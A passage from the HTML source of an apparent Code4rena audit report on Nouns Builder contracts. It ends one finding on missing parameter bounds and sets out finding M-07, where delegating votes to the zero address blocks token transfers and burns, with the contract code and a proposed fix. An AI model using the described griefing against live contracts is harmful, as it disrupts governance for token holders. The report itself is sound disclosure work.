0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement reasonable range bounds reverting where appropriate. In particular for the above apply:</p>\n<ul>\n<li>Governor settings <code>quorumThresholdBps</code> &#x3C;= 10_000</li>\n<li>Governor settings <code>proposalThresholdBps</code> &#x3C;= 10_000</li>\n<li>Treasury settings <code>delay</code> &#x3C;= 6 months</li>\n<li>Auction settings <code>duration</code> &#x3C;= 6 months</li>\n<li>Auction settings <code>timeBuffer</code> &#x3C;= 6 months</li>\n</ul>\n<p>Add these checks to the <code>initialize()</code> functions and in the setter / update functions where these individual settings properties can be updated.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482#issuecomment-1249935989\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Lack of validation looks right, not convinced about severity if behind timelock.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482#issuecomment-1257273463\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to a lack of rational minimums and maximums, governance can be griefed if not effectively bricked.</p>\n<p>Because this is contingent on allowing “irrational” values, I agree with Medium Severity.</p>\n<p>Mitigation would require adding acceptable minimums and maximums, or forcing the deployer to set those in a rational way that is transparent to end users.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/482\">iainnash (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-07-nft-owner-can-block-token-burning-and-transfer-by-delegating-to-zero-address\" style=\"position:relative;\"><a href=\"#m-07-nft-owner-can-block-token-burning-and-transfer-by-delegating-to-zero-address\" aria-label=\"m 07 nft owner can block token burning and transfer by delegating to zero address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/478\">[M-07] NFT owner can block token burning and transfer by delegating to zero address</a></h2>\n<p><em>Submitted by hyh</em></p>\n<p>ERC721Votes’s delegate() and delegateBySig() allow the delegation to zero address, which result in owner’s votes elimination in the checkpoint. I.e. the votes are subtracted from the owner, but aren’t added anywhere. _moveDelegateVotes() invoked by _delegate() treats the corresponding call as a burning, erasing the votes.</p>\n<p>The impact is that the further transfer and burning attempts for the ids of the owner will be reverted because _afterTokenTransfer() callback will try to reduce owner’s votes, which are already zero, reverting the calls due to subtraction fail.</p>\n<p>As ERC721Votes is parent to Token the overall impact is governance token burning and transfer being disabled whenever the owner delegated to zero address. This can be done deliberately, i.e. any owner can disable burning and transfer of the owned ids at any moment, which can interfere with governance voting process.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>User facing delegate() and delegateBySig() allow for zero address delegation:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Delegates votes to an account</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param _to The address delegating votes to</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L144-L174</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delegateBySig</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_deadline</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_v</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_r</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_s</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the signature has not expired</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_deadline</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">EXPIRED_SIGNATURE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Used to store the digest</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">digest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Cannot realistically overflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Compute the hash of the domain seperator with the typed delegation data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">digest</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\x19\\x01</span><span class=\"mtk8\">&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk11\">DOMAIN_SEPARATOR</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DELEGATION_TYPEHASH</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nonces</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">]++, </span><span class=\"mtk12\">_deadline</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Recover the message signer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ecrecover</span><span class=\"mtk1\">(</span><span class=\"mtk12\">digest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_s</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure the recovered signer is the voter</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || </span><span class=\"mtk12\">recoveredAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">INVALID_SIGNATURE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Update the delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>And pass zero address to the _delegate() where it is being set:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the previous delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Store the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer voting weight from the previous delegate to the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>In this case _moveDelegateVotes() will reduce the votes from the owner, not adding it to anywhere as <code>_from</code> is the owner, while <code>_to</code> is zero address:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L203-L220</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token mint:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_from</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Get the sender&#39;s number of checkpoints</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">numCheckpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">]++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Used to store the sender&#39;s previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// If this isn&#39;t the sender&#39;s first checkpoint: Get their previous voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">checkpoints</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">][</span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk3\">// Update their voting weight</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">_writeCheckpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nCheckpoints</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevTotalVotes</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// If this isn&#39;t a token burn:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">// @ audit here we add the votes to the target, but only if it&#39;s not zero address</span></span></span></code></pre>\n<p>The owner might know that and can use such a delegation to interfere with the system by prohibiting of transferring/burning of his ids.</p>\n<p>This happens via _afterTokenTransfer() reverting as it’s becomes impossible to reduce owner’s votes balance by <code>1</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L271</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer 1 vote from the sender to the recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider prohibiting zero address as a delegation destination:</p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+\t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_to</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">INVALID_SIGNATURE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Get the previous delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Store the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">delegation</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DelegateChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_from</span><span class=\"mtk1\">, </span><span class=\"mtk12\">prevDelegate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Transfer voting weight from the previous delegate to the new delegate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_moveDelegateVotes</span><span 